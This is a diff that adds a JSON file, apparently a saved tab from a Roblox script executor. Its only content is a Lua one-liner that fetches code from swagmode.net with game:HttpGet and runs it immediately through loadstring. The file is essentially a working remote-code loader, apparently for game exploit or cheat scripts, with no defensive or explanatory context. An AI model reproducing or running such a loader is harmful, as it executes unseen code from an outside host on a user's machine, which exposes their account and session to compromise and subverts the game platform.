@@ -1,0 +1,6 @@
+[
+  {
+    "Name": "Tab 1",
+    "Content": "loadstring(game:HttpGet(\u0027https://swagmode.net/execute\u0027))()"
+  }
+]
